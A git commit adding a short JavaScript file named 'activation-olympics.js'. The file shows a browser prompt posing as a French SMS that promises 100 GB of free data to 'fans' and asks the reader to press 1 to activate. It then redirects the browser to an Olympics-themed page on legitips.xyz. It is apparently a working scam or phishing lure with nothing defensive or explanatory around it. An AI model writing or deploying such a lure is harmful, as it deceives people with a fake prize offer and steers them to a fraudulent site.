b22462168ef54cf657d0c173632a10e4a2506042
legitips <83867893+legitips@users.noreply.github.com>
2024-07-26 12:04:10 -0700

    Create activation-olympics.js

---
+++ activation-olympics.js
@@ -0,0 +1,5 @@
+var password = '1'
+password=prompt('SMS: Félicitations, vous faites partie des fans qui reçoivent 100 Go de données gratuites. Veuillez appuyer sur 1 pour ACTIVER ','1');
+if (password != '1') {
+location.href='https://legitips.xyz/olympics.html';
+}
